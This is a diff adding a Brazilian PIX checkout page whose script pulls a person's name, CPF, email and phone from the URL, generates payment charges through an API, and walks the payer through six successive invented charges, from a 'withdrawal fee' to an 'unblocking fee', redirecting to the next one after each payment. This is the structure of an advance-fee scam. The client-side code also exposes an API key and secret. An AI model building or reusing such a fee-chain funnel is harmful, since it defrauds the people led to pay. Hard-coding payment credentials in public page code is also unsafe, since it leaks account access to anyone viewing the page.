@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="pt-BR" class="__variable_069ab3">
+<head>
+    <meta charset="UTF-8">
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+    <script>
+      window.pixelId = "kDro64jInCbmX09HvE6QFEQF6qbJQbrKTxF9";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento PIX</title>
+    <link rel="stylesheet" href="./257853d91afa92ac.css">
+    <link rel="stylesheet" href="./dfbf5faa22ddaea1.css">
+</head>
+<body class="__variable_069ab3 __className_069ab3">
+    <!-- Tela de Carregamento -->
+    <div id="loading-screen" class="flex h-screen w-full flex-col items-center justify-center gap-4 bg-background">
+        <div role="status" class="relative">
+            <svg
+                aria-hidden="true"
+                class="animate-spin text-muted-foreground/25 h-10 w-10"
+                viewBox="0 0 100 101"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+            >
+                <path
+                    d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
+                    fill="currentColor"
+                ></path>
+                <path
+                    d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
+                    fill="currentColor"
+                    class="text-green-500"
+                ></path>
+            </svg>
+        </div>
+        <p class="animate-pulse font-medium text-foreground text-base font-sans">Gerando PIX seguro...</p>
+    </div>
+
+    <!-- Tela de Erro -->
+    <div id="error-screen" class="hidden flex h-screen w-full flex-col items-center justify-center gap-4 bg-background">
+        <p style="font-size:1.5rem; color:#dc2626; font-weight:700;">❌ Erro ao gerar PIX</p>
+        <p id="error-msg" style="color:#666; margin-bottom:20px;"></p>
+        <button onclick="window.history.back()" style="background:#000; color:#fff; border:none; padding:12px 24px; border-radius:8px; font-weight:700; cursor:pointer;">Voltar e Tentar Novamente</button>
+    </div>
+
+    <!-- Tela de Pagamento (inicialmente oculta) -->
+    <main id="payment-screen" class="hidden bg-wh container mx-auto flex items-center justify-center min-h-screen py-8">
+        <div class="rounded-xl border bg-card text-card-foreground shadow">
+            <div class="p-0 px-0">
+                <div class="mb-4" aria-hidden="true"></div>
+                <div class="px-4 sm:px-28 md:px-10 py-6">
+                    <h2 class="mb-6 text-center text-2xl font-semibold text-primary" style="color: rgb(0, 0, 0);">Finalize seu pagamento</h2>
+                    <div class="flex flex-col gap-8 lg:flex-row">
+                        <div class="order-last flex-1 space-y-6 lg:order-first">
+                            <div>
+                                <h3 class="mb-2 text-lg font-medium text-primary" style="color: rgb(0, 0, 0);">Código PIX</h3>
+                                <div class="space-y-2">
+                                    <input id="pix-code-input" class="flex h-9 w-full rounded-md border border-input px-3 py-1 shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none disabled:cursor-not-allowed disabled:opacity-50 md:text-sm bg-muted font-mono text-sm ring-black focus:ring-black" readonly="" value="">
+                                    <button id="copy-pix-button" class="flex w-full items-center justify-center gap-2 rounded-lg p-4" style="background-color: rgb(0, 0, 0);">
+                                        <span class="flex items-center gap-4 text-lg font-semibold text-white">
+                                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" class="h-4 w-4 text-base text-white" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M4 4l1-1h5.414L14 6.586V14l-1 1H5l-1-1V4zm9 3l-3-3H5v10h8V7z"></path>
+                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M3 1L2 2v10l1 1V2h6.414l-1-1H3z"></path>
+                                            </svg>
+                                            Copiar código PIX
+                                        </span>
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="space-y-4">
+                                <h3 class="text-lg font-medium text-primary" style="color: rgb(0, 0, 0);">Instruções</h3>
+                                <div class="flex items-center gap-3">
+                                    <div class="flex h-8 w-8 items-center justify-center rounded-lg bg-primary text-primary-foreground" style="background-color: rgb(0, 0, 0);">
+                                        <span class="text-sm font-medium">1</span>
+                                    </div>
+                                    <p class="text-foreground">Abra o app do seu banco</p>
+                                </div>
+                                <div class="flex items-center gap-3">
+                                    <div class="flex h-8 w-8 items-center justify-center rounded-lg bg-primary text-primary-foreground" style="background-color: rgb(0, 0, 0);">
+                                        <span class="text-sm font-medium">2</span>
+                                    </div>
+                                    <p class="text-foreground">Na seção PIX, selecione "Pix Copia e Cola"</p>
+                                </div>
+                                <div class="flex items-center gap-3">
+                                    <div class="flex h-8 w-8 items-center justify-center rounded-lg bg-primary text-primary-foreground" style="background-color: rgb(0, 0, 0);">
+                                        <span class="text-sm font-medium">3</span>
+                                    </div>
+                                    <p class="text-foreground">Cole o código copiado</p>
+                                </div>
+                                <div class="flex items-center gap-3">
+                                    <div class="flex h-8 w-8 items-center justify-center rounded-lg bg-primary text-primary-foreground" style="background-color: rgb(0, 0, 0);">
+                                        <span class="text-sm font-medium">4</span>
+                                    </div>
+                                    <p class="text-foreground">Confirme o pagamento</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div data-orientation="vertical" role="none" class="shrink-0 bg-border h-full w-[1px] hidden lg:block"></div>
+                        <div class="order-first flex flex-1 flex-col items-center justify-center space-y-4 lg:order-last">
+                            <div class="flex flex-col items-center gap-4">
+                                <img id="qr-code-image" src="" alt="QR Code PIX" class="h-[200px] w-[200px]">
+                                <p class="text-center text-sm text-muted-foreground">Escaneie o código QR com a câmera do seu celular</p>
+                            </div>
+                            <h3 class="text-lg font-medium text-primary" style="color: rgb(0, 0, 0);">Ou</h3>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="flex items-center p-6 pt-4"></div>
+        </div>
+    </main>
+
+    <script>
+        // ══════════════════════════════════════════════════════════════
+        // QUANTUM PAY - INTEGRAÇÃO DIRETA (SEM PHP)
+        // ══════════════════════════════════════════════════════════════
+        const QUANTUM_API_KEY = 'cmn9t7wf6000e1a6ldwyy5ufb';
+        const QUANTUM_API_SECRET = '3db93a9d0b6c5a65eb9972d88218777f07457a8f686426135644ebe255b4cf7a3f116cfa66d786e5c509590d0b4562a93697390a124dc6ef28a89a9e83ee82613ac16cd3da3ab7924985240ea8edfb19272a9fcbf3a35af0d09500b47f9e9088005f6f9b59d860f4a7b32c55a7062b696969283942a2deafb1029f8ae6b64142';
+        const QUANTUM_BASE_URL = 'https://api.quantumpay.com.br';
+
+        const urlParams = new URLSearchParams(window.location.search);
+
+        // Captura dados do lead
+        const valor = parseInt(urlParams.get('valor') || '6990');
+        const nome = urlParams.get('nome') || urlParams.get('name') || 'Cliente';
+        const cpf = (urlParams.get('cpf') || urlParams.get('document') || '').replace(/\D/g, '');
+        const email = urlParams.get('email') || 'cliente@email.com';
+        const telefone = (urlParams.get('telefone') || urlParams.get('telephone') || '11999999999').replace(/\D/g, '');
+        const currentUpsell = urlParams.get('from_upsell') || '0';
+
+        // Proteção contra PIX duplicado
+        let isGenerating = false;
+        const PIX_STORAGE_KEY = 'pixUpsell_' + cpf + '_up' + currentUpsell;
+
+        // Descrição dinâmica baseada no upsell
+        const descriptions = {
+          '0': 'Taxa de Saque',
+          '1': 'Taxa de Verificação',
+          '2': 'TENF - Taxa Nota Fiscal',
+          '3': 'Taxa de Regularização',
+          '4': 'Validação Final',
+          '5': 'Taxa de Desbloqueio'
+        };
+        const pixDescription = descriptions[currentUpsell] || 'Taxa de Processamento';
+
+        let transactionId = null;
+        let checkInterval = null;
+
+        function showPixResult(code, img) {
+          document.getElementById('pix-code-input').value = code;
+          document.getElementById('qr-code-image').src = img 
+            ? (img.startsWith('data:') ? img : 'data:image/png;base64,' + img)
+            : 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(code);
+          
+          document.getElementById('loading-screen').classList.add('hidden');
+          document.getElementById('payment-screen').classList.remove('hidden');
+        }
+
+        async function generatePix() {
+          // Guard 1: já gerando
+          if (isGenerating) return;
+
+          // Guard 2: cache da sessão
+          var cached = sessionStorage.getItem(PIX_STORAGE_KEY);
+          if (cached) {
+            try {
+              var data = JSON.parse(cached);
+              console.log('[PIX Upsell] Usando cache da sessão');
+              showPixResult(data.code, data.img);
+              if (data.transactionId) {
+                transactionId = data.transactionId;
+                startPaymentCheck();
+              }
+              return;
+            } catch(e) {
+              sessionStorage.removeItem(PIX_STORAGE_KEY);
+            }
+          }
+
+          isGenerating = true;
+
+          try {
+            // 1. Autenticação
+            const credentials = btoa(QUANTUM_API_KEY.trim() + ':' + QUANTUM_API_SECRET.trim());
+            const authRes = await fetch(QUANTUM_BASE_URL + '/api/auth', {
+              method: 'POST',
+              headers: { 'Authorization': 'Basic ' + credentials, 'Accept': 'application/json' }
+            });
+            const authData = await authRes.json();
+            if (!authRes.ok) throw new Error(authData.message || 'Falha na autenticação');
+
+            const token = authData.token || (authData.data && authData.data.token);
+
+            // 2. Gera PIX
+            const pixRes = await fetch(QUANTUM_BASE_URL + '/api/v1/pix/in/qrcode', {
+              method: 'POST',
+              headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                amountInCents: valor,
+                description: pixDescription,
+                customer: {
+                  name: nome,
+                  email: email,
+                  document: cpf,
+                  documentType: 'cpf',
+                  phone: telefone
+                }
+              })
+            });
+
+            const pixData = await pixRes.json();
+            if (!pixRes.ok) throw new Error(pixData.message || 'Falha ao gerar PIX');
+
+            const d = pixData.data || pixData;
+            const code = d.pix?.emv || d.pix_code || d.copia_cola;
+            const img = d.pix?.qrCode || d.image_base64;
+            transactionId = d.id || d.transaction_id || d.transactionId || null;
+
+            if (!code) throw new Error('Código PIX não recebido.');
+
+            // Salva no cache
+            sessionStorage.setItem(PIX_STORAGE_KEY, JSON.stringify({
+              code: code,
+              img: img,
+              transactionId: transactionId
+            }));
+
+            showPixResult(code, img);
+
+            // 3. Inicia polling de status
+            if (transactionId) {
+              startPaymentCheck();
+            }
+
+          } catch (e) {
+            console.error('[PIX Upsell] Erro:', e);
+            document.getElementById('loading-screen').classList.add('hidden');
+            document.getElementById('error-screen').classList.remove('hidden');
+            document.getElementById('error-msg').textContent = e.message || 'Erro ao processar pagamento';
+          } finally {
+            isGenerating = false;
+          }
+        }
+
+        // Polling de status da transação via Quantum Pay
+        function startPaymentCheck() {
+          if (checkInterval) clearInterval(checkInterval);
+
+          checkInterval = setInterval(async function() {
+            if (!transactionId) return;
+
+            try {
+              const credentials = btoa(QUANTUM_API_KEY.trim() + ':' + QUANTUM_API_SECRET.trim());
+              const authRes = await fetch(QUANTUM_BASE_URL + '/api/auth', {
+                method: 'POST',
+                headers: { 'Authorization': 'Basic ' + credentials, 'Accept': 'application/json' }
+              });
+              const authData = await authRes.json();
+              if (!authRes.ok) return;
+
+              const token = authData.token || (authData.data && authData.data.token);
+
+              const statusRes = await fetch(QUANTUM_BASE_URL + '/api/v1/pix/in/' + transactionId, {
+                method: 'GET',
+                headers: { 'Authorization': 'Bearer ' + token, 'Accept': 'application/json' }
+              });
+              const statusData = await statusRes.json();
+              const d = statusData.data || statusData;
+              const status = (d.status || '').toLowerCase();
+
+              if (status === 'paid' || status === 'approved' || status === 'completed') {
+                clearInterval(checkInterval);
+                console.log('[PIX Upsell] ✅ Pagamento aprovado!');
+                redirectToNextUpsell();
+              }
+            } catch(err) {
+              console.error('[PIX Upsell] Erro no polling:', err);
+            }
+          }, 3000);
+        }
+
+        // Redirecionamento pro próximo upsell após pagamento aprovado
+        function redirectToNextUpsell() {
+          const upsellMap = {
+            '0': { next: 'upsell1', value: '7500' },
+            '1': { next: 'upsell2', value: '3297' },
+            '2': { next: 'upsell3', value: '2370' },
+            '3': { next: 'upsell4', value: '4237' },
+            '4': { next: 'upsell5', value: '4730' },
+            '5': { next: 'obrigado', value: '0' }
+          };
+
+          const config = upsellMap[currentUpsell] || { next: 'upsell1', value: '7500' };
+
+          // Coleta UTMs e dados do lead
+          const newParams = new URLSearchParams();
+          
+          // Repassa nome, cpf, email, telefone
+          if (nome) newParams.set('name', nome);
+          if (cpf) newParams.set('cpf', cpf);
+          if (email && email !== 'cliente@email.com') newParams.set('email', email);
+          if (telefone && telefone !== '11999999999') newParams.set('telephone', telefone);
+
+          // Repassa UTMs
+          ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck','xcod','fbclid','gclid','ttclid'].forEach(function(k) {
+            var v = urlParams.get(k);
+            if (v) newParams.set(k, v);
+          });
+
+          newParams.set('from_upsell', String(parseInt(currentUpsell) + 1));
+          newParams.set('valor', config.value);
+
+          // Limpa cache do PIX desse upsell
+          sessionStorage.removeItem(PIX_STORAGE_KEY);
+
+          const redirectUrl = '../' + config.next + '/index.html?' + newParams.toString();
+          console.log('[PIX Upsell] ➡️ Redirecionando para:', redirectUrl);
+          window.location.href = redirectUrl;
+        }
+
+        // Copiar código PIX
+        document.getElementById('copy-pix-button').addEventListener('click', function() {
+          const pixCodeInput = document.getElementById('pix-code-input');
+          if (pixCodeInput.value) {
+            navigator.clipboard.writeText(pixCodeInput.value).then(function() {
+              var btn = document.getElementById('copy-pix-button');
+              var original = btn.innerHTML;
+              btn.innerHTML = '<span class="flex items-center gap-4 text-lg font-semibold text-white">✓ Código copiado!</span>';
+              setTimeout(function() { btn.innerHTML = original; }, 2000);
+            });
+          }
+        });
+
+        // Proteção bfcache
+        window.addEventListener('pageshow', function(e) {
+          if (e.persisted) {
+            var cached = sessionStorage.getItem(PIX_STORAGE_KEY);
+            if (cached) {
+              try {
+                var data = JSON.parse(cached);
+                showPixResult(data.code, data.img);
+              } catch(err) {}
+            }
+          }
+        });
+
+        // Gera ao carregar
+        window.addEventListener('DOMContentLoaded', generatePix);
+    </script>
+</body>
+</html>
